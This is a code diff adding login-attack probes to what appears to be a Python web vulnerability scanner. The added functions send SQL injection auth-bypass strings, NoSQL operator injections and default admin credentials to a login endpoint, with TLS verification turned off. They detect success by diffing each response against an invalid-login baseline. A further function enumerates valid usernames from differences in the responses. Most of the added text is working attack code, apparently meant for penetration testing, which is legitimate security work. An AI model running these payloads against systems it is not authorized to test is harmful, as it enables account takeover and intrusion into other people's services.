@@ -790,3 +790,141 @@ async def resource_probe(url: str, method: str = "POST") -> dict:
             f" (max {max_kb}KB, aggressive={'on' if aggressive else 'off, set KRYX_RESOURCE_AGGRESSIVE=1'}).")
     return {"url": url, "vulnerable": len(findings) > 0, "findings": findings,
             "baseline_status": base_status, "note": note}
+
+
+# ── Auth-attack probes ─────────────────────────────────────────────────────
+# Break the login itself: SQL/NoSQL auth bypass, default creds, username
+# enumeration. Low request volume; standard pentest payloads.
+_SUCCESS_WORDS = ("logout", "sign out", "dashboard", "welcome", "my account",
+                  "profile", "token", "success", "authorized", "invalid password",
+                  "wrong password", "incorrect password")
+_LOGIN_FAIL_WORDS = ("invalid", "incorrect", "wrong", "failed", "denied", "unauthor")
+
+
+async def _post_login(c, url: str, data: dict, as_json: bool):
+    """One login attempt. Returns a compact response signature."""
+    try:
+        if as_json:
+            r = await c.post(url, json=data)
+        else:
+            r = await c.post(url, data=data)
+    except Exception as e:
+        return {"error": str(e)[:80]}
+    body = (r.text or "")[:8000]
+    setc = r.headers.get_list("set-cookie") if hasattr(r.headers, "get_list") \
+        else ([r.headers["set-cookie"]] if "set-cookie" in r.headers else [])
+    # a "session-looking" cookie = plausible successful auth
+    sess = any(k in " ".join(setc).lower() for k in ("session", "sid", "token", "auth", "jwt", "connect."))
+    loc = r.headers.get("location", "")
+    return {"status": r.status_code, "len": len(body), "body": body.lower(),
+            "set_session_cookie": sess, "location": loc, "error": None}
+
+
+def _looks_authed(sig: dict, baseline: dict) -> bool:
+    """Did this attempt look more successful than an invalid-credential baseline?"""
+    if not sig or sig.get("error"):
+        return False
+    b = baseline or {}
+    # new session cookie the invalid baseline didn't get
+    if sig.get("set_session_cookie") and not b.get("set_session_cookie"):
+        return True
+    # redirect away from the login page (302 -> /dashboard etc.), not seen on invalid
+    loc = sig.get("location", "")
+    if loc and "login" not in loc.lower() and b.get("location", "").lower() != loc.lower():
+        return True
+    # status flipped (e.g. 401 -> 200) relative to invalid baseline
+    if b.get("status") and sig.get("status") == 200 and b.get("status") in (401, 403):
+        return True
+    # body gained success markers absent from the invalid baseline
+    bd, bb = sig.get("body", ""), b.get("body", "")
+    if any(w in bd and w not in bb for w in ("logout", "dashboard", "welcome", "my account", '"token"', "signed in")):
+        return True
+    return False
+
+
+async def auth_bypass_probe(url: str, user_field: str = "username",
+                            pass_field: str = "password") -> dict:
+    """Attack the login endpoint directly: SQL/NoSQL auth bypass + default
+    credentials, diffed against an invalid-credential baseline. `url` must be the
+    form/JSON login endpoint. Tries form-encoded and JSON bodies."""
+    url = _norm(url)
+    findings = []
+    rnd = f"kryxnouser{_time.time_ns() % 100000}"
+
+    for as_json in (False, True):
+        async with auth_client(timeout=10, follow_redirects=False, verify=False) as c:
+            baseline = await _post_login(c, url, {user_field: rnd, pass_field: rnd}, as_json)
+            if baseline.get("error") and as_json is False:
+                continue  # try JSON variant
+            # SQLi / default-cred payloads (string form)
+            attempts = [
+                ("SQLi", {user_field: "' OR '1'='1' -- ", pass_field: "x"}),
+                ("SQLi", {user_field: "admin' -- ", pass_field: "x"}),
+                ("SQLi", {user_field: "admin", pass_field: "' OR '1'='1"}),
+                ("default-cred", {user_field: "admin", pass_field: "admin"}),
+                ("default-cred", {user_field: "admin", pass_field: "password"}),
+            ]
+            if as_json:  # NoSQL operator injection only makes sense in JSON
+                attempts += [
+                    ("NoSQL", {user_field: "admin", pass_field: {"$ne": None}}),
+                    ("NoSQL", {user_field: {"$ne": None}, pass_field: {"$ne": None}}),
+                    ("NoSQL", {user_field: {"$gt": ""}, pass_field: {"$gt": ""}}),
+                ]
+            for kind, data in attempts:
+                sig = await _post_login(c, url, data, as_json)
+                if _looks_authed(sig, baseline):
+                    findings.append({
+                        "type": kind, "severity": "critical",
+                        "body_type": "json" if as_json else "form",
+                        "payload": {k: str(v) for k, v in data.items()},
+                        "proof": f"{kind} login payload authenticated (status {sig.get('status')}, "
+                                 f"session_cookie={sig.get('set_session_cookie')}, "
+                                 f"redirect={sig.get('location') or '-'}) vs invalid baseline "
+                                 f"(status {baseline.get('status')})."})
+                    break  # one confirmed bypass per body-type is enough
+        if findings:
+            break
+
+    return {"url": url, "vulnerable": len(findings) > 0, "findings": findings,
+            "note": "Auth bypass - SQL/NoSQL login injection + default credentials, diffed vs invalid baseline."}
+
+
+async def user_enum_probe(url: str, user_field: str = "username",
+                          pass_field: str = "password") -> dict:
+    """Username enumeration: compare the login/reset response for a likely-EXISTING
+    user vs a definitely-nonexistent one. A visible difference (message/status/size)
+    leaks which usernames are valid."""
+    url = _norm(url)
+    ghost = f"kryxnouser{_time.time_ns() % 100000}"
+    findings = []
+    for as_json in (False, True):
+        async with auth_client(timeout=10, follow_redirects=False, verify=False) as c:
+            r_ghost = await _post_login(c, url, {user_field: ghost, pass_field: "wrongpass123"}, as_json)
+            if not r_ghost.get("status"):
+                continue  # network error / no response - try the other body type
+            for known in ("admin", "administrator", "test", "root"):
+                r_known = await _post_login(c, url, {user_field: known, pass_field: "wrongpass123"}, as_json)
+                if not r_known.get("status"):
+                    continue
+                # different status, or notably different body length, or different error wording
+                diff_status = r_known["status"] != r_ghost["status"]
+                diff_len = abs(r_known["len"] - r_ghost["len"]) > 25
+                # wording: one says "user not found" the other "wrong password"
+                gb, kb = r_ghost["body"], r_known["body"]
+                wording = (("not found" in gb or "no such" in gb or "does not exist" in gb or "unknown" in gb)
+                           and ("password" in kb or "incorrect" in kb) and gb != kb)
+                if diff_status or diff_len or wording:
+                    reason = ("status" if diff_status else "response-size" if diff_len else "error-message")
+                    findings.append({
+                        "type": "username-enumeration", "severity": "medium",
+                        "body_type": "json" if as_json else "form",
+                        "existing_user_tested": known,
+                        "proof": f"Login response for '{known}' differs from a nonexistent user by {reason} "
+                                 f"(existing: status {r_known['status']} len {r_known['len']}; "
+                                 f"nonexistent: status {r_ghost['status']} len {r_ghost['len']}) - "
+                                 f"the endpoint leaks valid usernames."})
+                    break
+        if findings:
+            break
+    return {"url": url, "vulnerable": len(findings) > 0, "findings": findings,
+            "note": "Username enumeration via login-response differential (existing vs nonexistent user)."}
